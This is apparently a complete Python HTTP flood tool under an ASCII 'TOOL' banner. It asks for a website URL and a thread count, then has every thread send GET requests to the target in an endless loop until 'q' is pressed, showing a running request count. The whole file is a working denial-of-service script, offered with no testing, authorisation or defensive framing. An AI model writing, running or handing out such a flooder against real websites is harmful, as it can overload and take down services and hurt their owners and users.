import requests, threading, keyboard, sys, os
from colorama import Fore

os.system("cls && title terminal-tool")

logo = """
 ▄▀▀▀█▀▀▄  ▄▀▀▀▀▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄     
█    █  ▐ █      █ █      █ █    █      
▐   █     █      █ █      █ ▐    █      
   █      ▀▄    ▄▀ ▀▄    ▄▀     █       
 ▄▀         ▀▀▀▀     ▀▀▀▀     ▄▀▄▄▄▄▄▄▀ 
█                             █         
▐                             ▐         
"""
print(Fore.MAGENTA + logo)

# prompt the user for the website url and the number of threads
url = input(Fore.CYAN + 'website url > ')
num_threads = int(input(Fore.CYAN + 'number of threads > '))

# initialize variables to control program execution
stop_program = False
request_count = 0
request_count_lock = threading.Lock()
stop_event = threading.Event()

# inform the user how to stop the program
print(Fore.GREEN + "press 'q' to quit")

# function to send HTTP requests
def send_requests():
    global stop_program
    global request_count
    while not stop_program:
        try:
            response = requests.get(url)
            with request_count_lock:
                request_count += 1
            sys.stdout.write('\r' + Fore.MAGENTA + 'request {} - status code: {}'.format(request_count, response.status_code))
            sys.stdout.flush()
        except requests.exceptions.RequestException as e:
            print('\rrequest failed - status code: {}'.format(e))
    sys.stdout.write('\r')
    sys.stdout.flush()

# create and start threads to send requests
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.daemon = True
    thread.start()
    threads.append(thread)

# wait for the user to press 'q' to stop the program
keyboard.wait("q")
print(Fore.GREEN + "\nstopping...")
stop_program = True
